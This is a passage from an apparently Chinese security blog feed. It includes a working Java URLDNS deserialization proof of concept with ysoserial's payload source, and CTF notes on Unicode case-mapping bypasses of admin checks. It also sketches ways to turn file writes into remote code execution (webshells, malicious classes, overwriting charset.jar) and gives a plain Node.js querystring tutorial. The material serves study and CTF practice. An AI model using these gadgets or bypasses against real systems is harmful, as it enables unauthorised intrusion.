class="headerlink" title="为什么发送了两次请求？"></a>为什么发送了两次请求？</h2><p>可以看到上图中的结果显示一共发送了两次请求，调试后发现<code>HashMap.put()</code>方法也会调用一次<code>putVal()</code>方法<br><img src="images/image-20220918233144243.png" alt="image-20220918233144243"></p><p>为了规避实际环境中产生误判的情况，我们需要消除掉这一次多余的<code>DNS</code>请求。</p><p>我们在<code>put()</code>方法前先设置<code>hashCode</code>字段值不为<code>-1</code>就可以不进入<code>hashCode = handler.hashCode(this);</code>语句里，就可避免发送<code>DNS</code>请求。</p><p>最终 POC 如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/18 22:43</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">URLDNS</span> <span class="variable">urldns</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLDNS</span>();</span><br><span class="line">        urldns.serialize();</span><br><span class="line">        urldns.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://4b9cc854.dns.1433.eu.org&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> cls.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashCode.set(url, <span class="number">666</span>);</span><br><span class="line">        map.put(url, <span class="string">&quot;dotast&quot;</span>);</span><br><span class="line">        hashCode.set(url, -<span class="number">1</span>);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(map);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20220918233654716.png" alt="image-20220918233654716"></p><h2 id="ysoserial的实现"><a href="#ysoserial的实现" class="headerlink" title="ysoserial的实现"></a>ysoserial的实现</h2><p><code>ysoserial</code>是<code>java</code>反序列化利用链的集合工具，可以根据我们需要的利用链生成反序列 POC。项目地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/frohoff/ysoserial</span><br></pre></td></tr></table></figure><p>下载源代码后导入 idea，根据<code>pom.xml</code>文件中的引导设置<code>GeneratePayload.java</code>文件为<code>mainClass</code><br><img src="images/image-20220919172929224.png" alt="image-20220919172929224"></p><p>设置<code>URLDNS</code>的运行参数<img src="images/image-20220919173043221.png" alt="image-20220919173043221"></p><p>其中<code>URLDNS</code>利用链部分的实现源码如下（删除部分不重要的内容）：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>简化后如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); </span><br><span class="line"><span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler);</span><br><span class="line">ht.put(u, url); </span><br><span class="line">Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line">  <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>利用链如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Gadget Chain:</span><br><span class="line"> *     HashMap.readObject()</span><br><span class="line"> *       HashMap.putVal()</span><br><span class="line"> *         HashMap.hash()</span><br><span class="line"> *           URL.hashCode()</span><br></pre></td></tr></table></figure></p><p>可以看到<code>ysoserial</code>直接继承<code>URLStreamHandler</code>类重写了<code>getHostAddress()</code>方法为空，因此避免了在生成<code>payload</code>的时候发起<code>DNS</code>请求。</p><p><strong>那为什么反序列化后还能发送<code>DNS</code>请求？</strong></p><p>可以看到在<code>java.net.URL</code>类中<code>handler</code>参数被<code>transient</code>关键字修饰<br><img src="images/image-20220919182207942.png" alt="image-20220919182207942"></p><blockquote><p>一旦变量被transient修饰，变量将不再是对象持久化的一部分，该变量内容在序列化后无法获得访问（被忽略）</p></blockquote><p>因此在序列化的过程中会忽略掉<code>handler</code>，在反序列化时能正常执行<code>DNS</code>请求。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java大小写特性</title>
      <link href="/2021/11/10/javascript%E5%A4%A7%E5%B0%8F%E5%86%99%E7%89%B9%E6%80%A7/"/>
      <url>/2021/11/10/javascript%E5%A4%A7%E5%B0%8F%E5%86%99%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="javascript大小写特性"><a href="#javascript大小写特性" class="headerlink" title="javascript大小写特性"></a>javascript大小写特性</h1><p>在javascript中有几个特殊的字符需要记录一下</p><p>对于<code>toUpperCase()</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符&quot;ı&quot;、&quot;ſ&quot; 经过toUpperCase处理后结果为 &quot;I&quot;、&quot;S&quot;</span><br></pre></td></tr></table></figure><p>对于<code>toLowerCase()</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符&quot;K&quot;经过toLowerCase处理后结果为&quot;k&quot;(这个K不是K)</span><br></pre></td></tr></table></figure><p>在绕一些规则的时候就可以利用这几个特殊字符进行绕过</p><h2 id="CTF题实例-Hacktm中的一道Nodejs题"><a href="#CTF题实例-Hacktm中的一道Nodejs题" class="headerlink" title="CTF题实例 - Hacktm中的一道Nodejs题"></a><strong>CTF题实例 - Hacktm中的一道Nodejs题</strong></h2><p>题目部分源码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">isValidUser</span>(<span class="params">u</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    u.<span class="property">username</span>.<span class="property">length</span> &gt;= <span class="number">3</span> &amp;&amp;</span><br><span class="line">    u.<span class="property">username</span>.<span class="title function_">toUpperCase</span>() !== config.<span class="property">adminUsername</span>.<span class="title function_">toUpperCase</span>()</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">isAdmin</span>(<span class="params">u</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> u.<span class="property">username</span>.<span class="title function_">toLowerCase</span>() == config.<span class="property">adminUsername</span>.<span class="title function_">toLowerCase</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解题时需要登录管理员的用户名，但是在登录时，<code>isValidUser</code>函数会对用户输入的用户名进行<code>toUpperCase</code>处理，再与管理员用户名进行对比。如果输入的用户名与管理员用户名相同，就不允许登录。</p><p>但是我们可以看到，在之后的一个判断用户是否为管理员的函数中，对用户名进行处理的是<code>toLowerCase</code>。所以这两个差异，就可以使用大小写特性来进行绕过。</p><p>题目中默认的管理员用户名为：hacktm</p><p>所以，我们指定登录时的用户名为：hacKtm 即可绕过<code>isValidUser</code>和<code>isAdmin</code>的验证。</p><p>题目完整Writeup:<a href="https://xz.aliyun.com/t/7177">HackTM中一道Node.js题分析(Draw with us)</a></p><h2 id="MMCTF"><a href="#MMCTF" class="headerlink" title="MMCTF"></a>MMCTF</h2><p><code>nodejs</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/admin&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res, next</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">name</span> === <span class="literal">undefined</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;what&#x27;s your name?&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> name=req.<span class="property">body</span>.<span class="property">name</span>.<span class="title function_">toString</span>();</span><br><span class="line">    <span class="keyword">if</span>(name.<span class="title function_">toLowerCase</span>()!==<span class="string">&quot;admin&quot;</span>&amp;&amp;name.<span class="title function_">toUpperCase</span>()===<span class="string">&quot;ADMIN&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      req.<span class="property">session</span>.<span class="property">man</span>.<span class="property">attack</span>=<span class="number">300</span>;</span><br><span class="line">      res.<span class="title function_">send</span>(<span class="string">&quot;you&#x27;ve been stronger&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      res.<span class="title function_">send</span>(<span class="string">&quot;you are not admin!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>exp.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">300</span>;i&lt;=<span class="number">305</span>;i++)&#123;<span class="comment">//65535</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(i)+i);</span><br><span class="line">    <span class="keyword">var</span> name=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    name=<span class="string">&#x27;adm&#x27;</span>+<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(i)+<span class="string">&#x27;n&#x27;</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(name);</span><br><span class="line">    <span class="keyword">if</span>(name.<span class="title function_">toLowerCase</span>()!==<span class="string">&quot;admin&quot;</span>&amp;&amp;name.<span class="title function_">toUpperCase</span>()===<span class="string">&quot;ADMIN&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&#x27;success&#x27;</span>+<span class="string">&#x27;:&#x27;</span>+<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(i)+<span class="string">&#x27;:&#x27;</span>+i);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;success&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;fail&#x27;</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java项目杂事</title>
      <link href="/2021/11/10/javabean%E4%B8%8E%E5%86%85%E7%9C%81/"/>
      <url>/2021/11/10/javabean%E4%B8%8E%E5%86%85%E7%9C%81/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/uu5666/p/8601983.html">https://www.cnblogs.com/uu5666/p/8601983.html</a><br>简单的说安全问题就是可以调用set和get方法<br>参考 CB 链</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java项目杂事</title>
      <link href="/2021/11/10/java%E5%86%99%E6%96%87%E4%BB%B6rce/"/>
      <url>/2021/11/10/java%E5%86%99%E6%96%87%E4%BB%B6rce/</url>
      
        <content type="html"><![CDATA[<h2 id="如果Java项目存在写文件操作怎么rce"><a href="#如果Java项目存在写文件操作怎么rce" class="headerlink" title="如果Java项目存在写文件操作怎么rce?"></a>如果Java项目存在写文件操作怎么rce?</h2><h3 id="1-普通的Java-web项目"><a href="#1-普通的Java-web项目" class="headerlink" title="1.普通的Java web项目"></a>1.普通的Java web项目</h3><p>直接写jsp木马 （如果能解析</p><h3 id="2-如果不能解析jsp"><a href="#2-如果不能解析jsp" class="headerlink" title="2.如果不能解析jsp"></a>2.如果不能解析jsp</h3><p>通过写class文件让其触发某一个方法然后重写该方法rce。也就是把恶意类写入classpath( target/classes)，再通过某种方式加载、使用该恶意类，触发该恶意类的static代码块或执行该恶意类的某个方法，来实现通用的RCE利用。重点关注class.formane<br>可以参考2021国赛的ezj4va 就是通过重写readobject方法去触发rce。<br>或者可以参考d3ctf中的no rce题中也是写入target/classes中实现静态方法。然后通过jdbc去初始化恶意类触发。</p><h3 id="3-如果项目是jar打包启动的"><a href="#3-如果项目是jar打包启动的" class="headerlink" title="3.如果项目是jar打包启动的"></a>3.如果项目是jar打包启动的</h3><p>面前自己遇到的是springboot项目 通过覆盖charset.jar去hook实现rce。大概原理就是jvm启动的过程中不会全部加载资源如charset.jar是不会加载的只有通过特点方法才会加载。这样可以减少Java内存的消耗。<br>参考 文章springboot写文件rce</p><h3 id="springboot"><a href="#springboot" class="headerlink" title="springboot"></a>springboot</h3><p><a href="https://landgrey.me/blog/22/">https://landgrey.me/blog/22/</a></p><p><a href="https://threedr3am.github.io/2021/04/14/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84SpringBoot%20RCE/">https://threedr3am.github.io/2021/04/14/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84SpringBoot%20RCE/</a></p><h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h3><p><a href="https://threedr3am.github.io/2021/04/13/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84Fastjson%20RCE/">https://threedr3am.github.io/2021/04/13/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84Fastjson%20RCE/</a></p><p>&gt;<br><a href="https://www.cnblogs.com/wh4am1/p/14681335.html">https://www.cnblogs.com/wh4am1/p/14681335.html</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzI3MzUwMTQwNg==&amp;mid=2247485312&amp;idx=1&amp;sn=22dddceccf679f34705d987181a328db&amp;token=1393640502&amp;lang=zh_CN&amp;scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzI3MzUwMTQwNg==&amp;mid=2247485312&amp;idx=1&amp;sn=22dddceccf679f34705d987181a328db&amp;token=1393640502&amp;lang=zh_CN&amp;scene=21#wechat_redirect</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>nodejs的序列化与反序列化</title>
      <link href="/2021/11/10/learn/"/>
      <url>/2021/11/10/learn/</url>
      
        <content type="html"><![CDATA[<h1 id="nodejs-的序列化与反序列化"><a href="#nodejs-的序列化与反序列化" class="headerlink" title="nodejs 的序列化与反序列化"></a>nodejs 的序列化与反序列化</h1><h1 id="1-序列化"><a href="#1-序列化" class="headerlink" title="1.序列化"></a>1.序列化</h1><p><code>stringify</code>函数的作用就是序列化对象，也就是说将对象类型转换成一个字符串类型（默认的分割符（”&amp;”）和分配符（”=”）），先介绍它的基本用法，在下一节里我们将学习如何替换默认分配符，下面我们就通过以下例子来清楚的认识一下吧！</p><p>例1：querystring.stringify(“对象”)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> querystring= <span class="built_in">require</span>(<span class="string">&#x27;querystring&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> result = querystring.<span class="title function_">stringify</span>(&#123;<span class="attr">foo</span>:<span class="string">&#x27;bar&#x27;</span>,<span class="attr">cool</span>:[<span class="string">&#x27;xux&#x27;</span>, <span class="string">&#x27;yys&#x27;</span>]&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result);　　</span><br></pre></td></tr></table></figure><p>运行结果：<br>foo=bar&amp;cool=xux&amp;cool=yys</p><p>对象被序列化为字符串之后默认是通过分割符（”&amp;”）和分配符（”=”）组成的，那可不可以改变呢，这节我们就来了解一下，是否可以自己去定义组合结果，看下面的小例子</p><p>例1：querystring.stringify(“对象”，”分隔符”，”分配符”)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var querystring = require(&#x27;querystring&#x27;);</span><br><span class="line">var result = querystring.stringify(&#123;foo:&#x27;bar&#x27;,cool:[&#x27;xux&#x27;, &#x27;yys&#x27;]&#125;,&#x27;*&#x27;,&#x27;$&#x27;);</span><br><span class="line">console.log(result);</span><br></pre></td></tr></table></figure><p>运行结果：<br><code>&#39;foo$bar*cool$xux*cool$yys&#39;</code></p><h1 id="2-反序列化"><a href="#2-反序列化" class="headerlink" title="2.反序列化"></a>2.反序列化</h1><p>接下来就来学习反序列化函数——parse函数，parse函数的作用就是反序列化字符串（默认是由”=”、”&amp;”拼接而成），转换得到一个对象类型。如下示例：</p><p>例1：querystring.parse(“字符串”)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var querystring = require(&#x27;querystring&#x27;);</span><br><span class="line">var result = querystring.parse(&#x27;foo=bar&amp;cool=xux&amp;cool=yys&#x27;);</span><br><span class="line">console.log(result);</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><code>&#123; foo: &#39;bar&#39;, cool: [&#39;xux&#39;, &#39;yys&#39;]&#125;</code></p><p>现在我们学习parse函数的扩展用法，和上面stringify函数的多参数用法不同的是，parse函数可以根据用户所自定义的分割符、分配符来反序列化字符串，从而得到相应的对象结果.如下示例：</p><p>例1：querystring.parse(“字符串”，”分隔符”，”分配符”)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var querystring = require(&#x27;querystring&#x27;);</span><br><span class="line">var result = querystring.parse(&#x27;foo@bar$cool@xux$cool@yys&#x27;,&#x27;@&#x27;,&#x27;$&#x27;);</span><br><span class="line">console.log(result);</span><br></pre></td></tr></table></figure><p>运行结果：<br><code>&#123; foo: &#39;&#39;, bar: &#39;cool&#39;, xux: &#39;cool&#39;, yys: &#39;&#39; &#125;</code></p><blockquote><p>参考：</p><p><a href="https://www.cnblogs.com/smiler/p/4741875.html">https://www.cnblogs.com/smiler/p/4741875.html</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java项目杂事</title>
      <link href="/2021/11/10/marshalsec/"/>
      <url>/2021/11/10/marshalsec/</url>
      
